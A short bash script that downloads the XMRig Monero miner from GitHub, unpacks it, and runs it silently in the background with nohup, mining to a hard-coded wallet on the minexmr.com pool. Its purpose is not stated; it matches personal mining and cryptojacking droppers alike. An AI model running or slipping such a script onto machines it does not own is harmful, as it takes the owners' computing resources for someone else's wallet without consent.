#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz && tar xvzf  xmrig-6.5.3-linux-x64.tar.gz 
nohup ./xmrig-6.5.3/xmrig -o us-west.minexmr.com:4444 -u 84J1AXpwQfrA92Yw81zg1MPWUn7dAYK7adcwW9qNRSHkLMcVRvoSZghZvAwvdNv1PwWL54Tc6m6JG3btLsqQ8gZGGJduZfZ --rig-id "G 2" &
